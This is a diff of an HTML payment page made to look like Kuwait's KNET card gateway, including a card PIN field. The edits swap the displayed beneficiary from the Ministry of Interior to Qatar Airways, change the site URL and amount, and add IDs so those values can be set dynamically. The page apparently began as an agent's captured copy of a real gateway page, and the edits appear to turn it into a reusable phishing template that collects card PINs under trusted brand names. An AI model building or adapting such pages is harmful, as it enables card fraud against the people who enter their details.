 <ul class="suggestion-box" id="cardSuggestions"></ul>
 </div>
@@ -4292,7 +4540,7 @@ display: none;
 														</span>
 </div>
 <div class="col w-60">
-<input autocomplete="off" class="paymentinput pinmask" data-1p-ignore="true" data-form-type="other" data-lpignore="true" data-manus_click_id="4" data-manus_clickable="true" dir="rtl" id="cardPin" inputmode="numeric" maxlength="4" name="paymentPin" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style=" float:right; width:212px;margin-left: 10px;  text-align:right;margin-bottom:2px; padding-right:5px;" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="text"/>
+<input autocomplete="off" class="paymentinput pinmask" data-1p-ignore="true" data-form-type="other" data-lpignore="true" data-manus_click_id="4" data-manus_clickable="true" dir="rtl" id="cardPin" inputmode="numeric" maxlength="4" name="paymentPin" oncopy="return false;" ondrop="return false;" onkeypress="return ValidateNumPin(event);" onkeyup="ValidateNumPin(event);ValidatePinCvv(event);" onpaste="return false;" size="4" style=" float:right; width:60%; min-width:150px;margin-left: 10px;  text-align:right;margin-bottom:2px; padding-right:5px;" title="يجب أن يكون الرمز السري مكون من ٤ أرقام" type="text"/>
 </div>
 </div>
 <div class="row" id="CvvField">
@@ -4360,16 +4608,16 @@ display: none;
 <p class="paymentheader" style="padding-top: 18px; padding-bottom:  22px; text-align:right">معلومات الفاتورة </p>
 <div class="innerwrapper">
 <div class="row">
-<div class="col w-60" style="text-align: right; "><span class="paymentdata">Ministry of Interior</span> </div>
+<div class="col w-60" style="text-align: right; "><span class="paymentdata" id="knetBeneficiaryConfirm">الخطوط الجوية القطرية</span> </div>
 <div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel">:المستفيد </span></div>
 </div>
 <div class="row">
-<div class="col w-60" style="text-align:right;"><span class="paymentdata" style="word-break: break-all;">https://www.moi.gov.kw</span></div>
+<div class="col w-60" style="text-align:right;"><span class="paymentdata" style="word-break: break-all;" id="knetSiteConfirm">https://www.qatarairways.com</span></div>
 <div class="col w-40" style="text-align: right;float:right;"><span class="paymentlabel">:الموقع  </span></div>
 </div>
 <div class="row" id="OrgTranxAmtConfirm">
-<div class="col w-60" style="text-align:right; "><span class="paymentdata">
-                            KD 100.000
+<div class="col w-60" style="text-align:right; "><span class="paymentdata" id="knetAmountConfirm">
+                            KD&nbsp;2.800
                             </span>
 </div>
 <div class="col w-40" style="text-align:right;float:right;">
